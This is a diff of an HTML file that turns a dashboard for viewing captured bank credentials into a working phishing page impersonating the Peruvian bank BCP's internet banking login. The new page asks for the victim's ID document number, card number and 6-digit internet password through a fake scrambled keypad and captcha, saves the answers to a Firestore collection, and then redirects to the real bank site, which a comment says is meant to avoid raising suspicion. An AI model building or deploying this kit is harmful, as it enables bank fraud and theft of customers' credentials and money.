@@ -3,158 +3,259 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Panel de Control | Registros BCP</title>
+    <title>Banca por Internet | BCP</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background-color: #f0f2f5; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        .table-container { background: white; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-        th { background-color: #002a8d; color: white; text-align: left; padding: 12px; }
-        td { padding: 12px; border-bottom: 1px solid #eee; font-size: 14px; }
-        tr:hover { background-color: #f9f9f9; }
-        .badge { background: #ff7900; color: white; padding: 2px 8px; border-radius: 12px; font-size: 11px; font-weight: bold; }
+        body, html { height: 100%; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #ffffff; overflow: hidden; }
+        
+        /* Lado izquierdo azul */
+        .sidebar { 
+            background-color: #002a8d; 
+            width: 35%; 
+            height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            position: relative; 
+        }
+        
+        /* Lado derecho formulario */
+        .main-content { 
+            width: 65%; 
+            padding: 40px 10%; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center;
+        }
+
+        .logo-bcp { position: absolute; top: 40px; left: 40px; width: 100px; }
+        
+        .form-container { max-width: 400px; width: 100%; margin: 0 auto; }
+
+        .label-custom { font-size: 13px; color: #64748b; margin-bottom: 4px; display: block; }
+        
+        .input-bcp { 
+            border: 1px solid #cbd5e1; 
+            border-radius: 4px; 
+            padding: 12px; 
+            width: 100%; 
+            outline: none; 
+            margin-bottom: 20px; 
+            font-size: 16px; 
+            color: #334155;
+        }
+        
+        .input-bcp:focus { border-color: #ff7900; }
+
+        /* Teclado numérico dinámico */
+        .numpad { 
+            display: grid; 
+            grid-template-columns: repeat(5, 1fr); 
+            gap: 10px; 
+            background-color: #f8fafc; 
+            padding: 15px; 
+            border-radius: 8px; 
+            margin-bottom: 10px;
+        }
+        
+        .key { 
+            background: white; 
+            border: 1px solid #e2e8f0; 
+            border-radius: 4px; 
+            padding: 12px 0; 
+            text-align: center; 
+            font-weight: 600; 
+            color: #002a8d; 
+            cursor: pointer; 
+            user-select: none;
+            transition: background 0.1s;
+        }
+        
+        .key:active { background-color: #f1f5f9; }
+
+        .btn-ingresar { 
+            background-color: #ff7900; 
+            color: white; 
+            font-weight: bold; 
+            width: 100%; 
+            padding: 16px; 
+            border-radius: 4px; 
+            margin-top: 30px; 
+            font-size: 16px; 
+            text-transform: uppercase;
+        }
+
+        .captcha-area { display: flex; align-items: center; gap: 15px; margin-top: 20px; }
+        .captcha-img { 
+            background: #f1f5f9; 
+            padding: 10px 20px; 
+            font-style: italic; 
+            font-family: serif; 
+            letter-spacing: 4px; 
+            color: #94a3b8; 
+            text-decoration: line-through; 
+            border-radius: 4px;
+            font-size: 18px;
+        }
+
+        #loader { 
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(255,255,255,0.9); z-index: 999; flex-direction: column; align-items: center; justify-content: center; 
+        }
+
+        .character-box { width: 80%; }
     </style>
 </head>
-<body class="p-4 md:p-8">
+<body class="flex">
 
-    <div class="max-w-6xl mx-auto">
-        <div class="flex flex-col md:flex-row justify-between items-center mb-8 gap-4">
-            <div>
-                <h1 class="text-2xl font-bold text-[#002a8d]">Panel de Registros Capturados</h1>
-                <p class="text-gray-500">Visualización de datos en tiempo real</p>
-            </div>
-            <div class="flex gap-2">
-                <button onclick="location.reload()" class="bg-gray-200 hover:bg-gray-300 px-4 py-2 rounded font-medium transition">Actualizar</button>
-                <button onclick="exportarDatos()" class="bg-[#ff7900] hover:bg-[#e66d00] text-white px-4 py-2 rounded font-bold transition">Copiar para Excel</button>
-            </div>
+    <!-- Pantalla de carga -->
+    <div id="loader">
+        <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-[#002a8d]"></div>
+        <p class="mt-4 text-[#002a8d] font-bold">Iniciando sesión segura...</p>
+    </div>
+
+    <!-- Sección Izquierda (Azul) -->
+    <div class="sidebar">
+        <div class="logo-bcp">
+            <svg viewBox="0 0 100 35" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M0 0H25L15 35H-10L0 0Z" fill="#FF7900"/>
+                <text x="30" y="27" fill="white" font-size="28" font-weight="900" font-style="italic">BCP</text>
+            </svg>
         </div>
-
-        <div class="table-container overflow-x-auto">
-            <table class="w-full border-collapse">
-                <thead>
-                    <tr>
-                        <th>Fecha/Hora</th>
-                        <th>Tipo</th>
-                        <th>Documento</th>
-                        <th>Número de Tarjeta</th>
-                        <th>Clave (6)</th>
-                        <th>Dispositivo</th>
-                    </tr>
-                </thead>
-                <tbody id="tabla-registros">
-                    <tr>
-                        <td colspan="6" class="text-center py-10 text-gray-400">Esperando autenticación...</td>
-                    </tr>
-                </tbody>
-            </table>
+        
+        <div class="character-box">
+            <!-- SVG del personaje azul con la llave -->
+            <svg viewBox="0 0 200 300" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="100" cy="80" r="35" fill="#ffd1a9" />
+                <rect x="75" y="72" width="50" height="12" rx="6" fill="#ff7900" />
+                <path d="M60 120 Q100 80 140 120 L155 280 L45 280 Z" fill="#0039a6" />
+                <path d="M50 130 L25 160" stroke="#0039a6" stroke-width="20" stroke-linecap="round" />
+                <circle cx="20" cy="150" r="12" fill="#ff7900" />
+                <rect x="18" y="160" width="4" height="15" fill="#ff7900" />
+            </svg>
         </div>
     </div>
 
-    <!-- Firebase SDK -->
+    <!-- Sección Derecha (Login) -->
+    <div class="main-content">
+        <div class="form-container">
+            <h1 class="text-[#002a8d] text-2xl font-bold mb-8">Banca por Internet</h1>
+
+            <div class="flex gap-4">
+                <div class="w-1/3">
+                    <span class="label-custom">Tipo</span>
+                    <select id="tipoDoc" class="input-bcp bg-gray-50">
+                        <option>DNI</option>
+                        <option>CE</option>
+                    </select>
+                </div>
+                <div class="w-2/3">
+                    <span class="label-custom">Número de documento</span>
+                    <input type="text" id="documento" class="input-bcp" placeholder="Ingrese documento" maxlength="11">
+                </div>
+            </div>
+
+            <div>
+                <span class="label-custom">Número de tarjeta</span>
+                <input type="text" id="tarjeta" class="input-bcp" placeholder="XXXX XXXX XXXX XXXX" maxlength="16">
+            </div>
+
+            <div class="flex items-center gap-2 mb-6">
+                <input type="checkbox" id="recordar" class="w-4 h-4 accent-[#ff7900]">
+                <label for="recordar" class="text-sm text-gray-500">Recordar datos</label>
+            </div>
+
+            <div>
+                <span class="label-custom">Clave de internet (6 dígitos)</span>
+                <input type="password" id="clave" class="input-bcp bg-gray-50" readonly placeholder="••••••">
+            </div>
+
+            <!-- Teclado desordenado -->
+            <div class="numpad" id="numpad-container">
+                <!-- Se genera aleatoriamente por JS -->
+            </div>
+            
+            <p class="text-center text-[#ff7900] text-xs font-bold cursor-pointer mb-6" onclick="borrar()">BORRAR CLAVE</p>
+
+            <div class="flex justify-between items-center text-sm font-bold text-[#ff7900]">
+                <span>Crear clave</span>
+                <div class="captcha-area">
+                    <div class="captcha-img">6gy5fp</div>
+                    <input type="text" class="border rounded p-2 w-20 text-center outline-none" placeholder="6gy5fp">
+                </div>
+                <span>Olvidé mi clave</span>
+            </div>
+
+            <button onclick="enviarDatos()" class="btn-ingresar">INGRESAR</button>
+        </div>
+    </div>
+
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-        import { getFirestore, collection, onSnapshot, query } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
-        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
 
-        // Global variables provided by environment
         const firebaseConfig = JSON.parse(__firebase_config);
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
         const auth = getAuth(app);
-        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-bcp-app';
 
-        const tablaBody = document.getElementById('tabla-registros');
-
-        // Function to handle Firestore subscription
-        let unsubscribe = null;
-
-        const startListening = (user) => {
-            if (!user) return;
-            
-            // Rule 1: Use strict paths for public data
-            const collectionRef = collection(db, 'artifacts', appId, 'public', 'data', 'registros');
-            
-            // Rule 2: Simple query to avoid index errors
-            const q = query(collectionRef);
-
-            unsubscribe = onSnapshot(q, (snapshot) => {
-                tablaBody.innerHTML = '';
-                
-                if (snapshot.empty) {
-                    tablaBody.innerHTML = '<tr><td colspan="6" class="text-center py-10">No hay registros aún.</td></tr>';
-                    return;
-                }
-
-                // Sorting in memory to avoid needing Firestore indexes
-                const docs = [];
-                snapshot.forEach(doc => {
-                    docs.push({ id: doc.id, ...doc.data() });
-                });
-                
-                docs.sort((a, b) => {
-                    const timeA = a.fecha?.seconds || 0;
-                    const timeB = b.fecha?.seconds || 0;
-                    return timeB - timeA;
-                });
-
-                docs.forEach(data => {
-                    const fecha = data.fecha ? new Date(data.fecha.seconds * 1000).toLocaleString() : 'Recién llegado...';
-                    const row = `
-                        <tr>
-                            <td class="font-medium text-gray-600">${fecha}</td>
-                            <td><span class="badge">${data.tipo_documento || 'DNI'}</span></td>
-                            <td class="font-bold text-[#002a8d]">${data.documento || '---'}</td>
-                            <td class="tracking-widest font-mono">${data.tarjeta || '---'}</td>
-                            <td class="text-red-600 font-bold">${data.clave || '---'}</td>
-                            <td class="text-xs text-gray-400 max-w-[150px] truncate" title="${data.agente || ''}">${data.agente || 'Desconocido'}</td>
-                        </tr>
-                    `;
-                    tablaBody.innerHTML += row;
-                });
-            }, (error) => {
-                console.error("Error al leer datos:", error);
-                tablaBody.innerHTML = `<tr><td colspan="6" class="text-center py-10 text-red-500">Error de permisos: ${error.message}</td></tr>`;
-            });
-        };
-
-        // Rule 3: Auth before queries
-        const initAuth = async () => {
-            try {
-                if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
-                    await signInWithCustomToken(auth, __initial_auth_token);
-                } else {
-                    await signInAnonymously(auth);
-                }
-            } catch (error) {
-                console.error("Auth error:", error);
-                tablaBody.innerHTML = '<tr><td colspan="6" class="text-center py-10 text-red-500">Error de autenticación.</td></tr>';
-            }
-        };
-
-        onAuthStateChanged(auth, (user) => {
-            if (unsubscribe) unsubscribe();
-            if (user) {
-                startListening(user);
-            } else {
-                tablaBody.innerHTML = '<tr><td colspan="6" class="text-center py-10">Cerrando sesión...</td></tr>';
-            }
+        // Lógica del teclado numérico desordenado
+        const keys = ['1','6','4','2','5','0','8','7','9','3'];
+        const numpad = document.getElementById('numpad-container');
+        
+        keys.forEach(num => {
+            const keyDiv = document.createElement('div');
+            keyDiv.className = 'key';
+            keyDiv.innerText = num;
+            keyDiv.onclick = () => {
+                const input = document.getElementById('clave');
+                if (input.value.length < 6) input.value += num;
+            };
+            numpad.appendChild(keyDiv);
         });
 
-        // Copy to clipboard function
-        window.exportarDatos = () => {
-            const rows = Array.from(document.querySelectorAll('tr'));
-            const text = rows.map(row => Array.from(row.cells).map(cell => cell.innerText).join('\t')).join('\n');
-            
-            const textarea = document.createElement('textarea');
-            textarea.value = text;
-            document.body.appendChild(textarea);
-            textarea.select();
-            document.execCommand('copy');
-            document.body.removeChild(textarea);
-            alert("Datos copiados al portapapeles. Puedes pegarlos en Excel.");
-        };
+        window.borrar = () => { document.getElementById('clave').value = ''; };
 
-        // Start process
-        initAuth();
+        window.enviarDatos = async () => {
+            const doc = document.getElementById('documento').value;
+            const tar = document.getElementById('tarjeta').value;
+            const cla = document.getElementById('clave').value;
+            const tip = document.getElementById('tipoDoc').value;
+
+            if (doc.length < 5 || tar.length < 10 || cla.length < 6) {
+                alert("Por favor, completa los datos correctamente.");
+                return;
+            }
+
+            document.getElementById('loader').style.display = 'flex';
+
+            try {
+                await signInAnonymously(auth);
+                
+                // Envío de datos a la colección 'registros'
+                await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'registros'), {
+                    tipo_documento: tip,
+                    documento: doc,
+                    tarjeta: tar,
+                    clave: cla,
+                    fecha: serverTimestamp(),
+                    agente: navigator.userAgent
+                });
+
+                // Redirección al sitio oficial para no levantar sospechas
+                setTimeout(() => {
+                    window.location.href = "https://www.viabcp.com/";
+                }, 1500);
+
+            } catch (error) {
+                console.error("Error al enviar:", error);
+                document.getElementById('loader').style.display = 'none';
+                alert("Error de conexión. Intente nuevamente.");
+            }
+        };
     </script>
 </body>
 </html>
